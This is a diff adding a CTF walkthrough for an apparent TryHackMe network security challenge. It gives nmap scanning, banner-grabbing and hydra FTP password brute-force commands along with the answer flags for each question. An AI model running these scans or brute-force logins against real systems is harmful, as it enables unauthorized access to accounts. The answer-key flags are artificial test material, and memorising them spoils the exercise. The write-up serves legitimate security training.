@@ -1,0 +1,38 @@
+📌NET SEC CHALLENGE :
+	 🔴Questions  :
+	 1)What is the highest port number being open less than 10,000?
+	 ---> use command :  nmap -sS -v <target-ip>  
+	 Answer : 8080
+	 
+	 2)There is an open port outside the common 1000 ports; it is above 10,000. What is it?
+	 ---> use command :  nmap -sS -p10000-65535 <target-ip> 
+	 Answer : 10021
+	 
+	 3)How many TCP ports are open?
+	 ---> use command :  nmap -sS -p- <target-ip> 
+	 Answer : 6
+	 
+	 4)What is the flag hidden in the HTTP server header?
+	 ---> use command : telnet <target-ip> 80 
+	 Answer : THM{web_server_25352}
+	 
+	 5)What is the flag hidden in the SSH server header?
+	 ---> use command  : ssh <target-ip> 22
+	 Answer : THM{946219583339}
+	 
+	 6)We have an FTP server listening on a nonstandard port. What is the version of the FTP server?
+	 ---> use command : nmap -sS -p10021 -sV <target-ip>
+	 Answer : vsftpd 3.0.5
+	 
+	 7)We learned two usernames using social engineering: eddie and quinn. What is the flag hidden in one of these two account files and accessible via FTP?
+	 ---> use these two hydra command to answer these question :
+	 1) hydra -l quinn -P /usr/share/wordlists/rockyou.txt ftp://<target-ip>:10021
+	 2) hydra -l eddie -P /usr/share/wordlists/rockyou.txt ftp://<target-ip>:10021
+	 use these two username and password and see for txt file which consist of flag and use command (get ftp_flag.txt).
+	 Answer : THM{321452667098}
+	 
+	 7)Browsing to http://MACHINE_IP:8080 displays a small challenge that will give you a flag once you solve it. What is the flag?
+	 ---> in this task use attack box , use commadnd : nmap -sN <target-ip>
+	 Answer : THM{f7443f99}
+	 
+	 
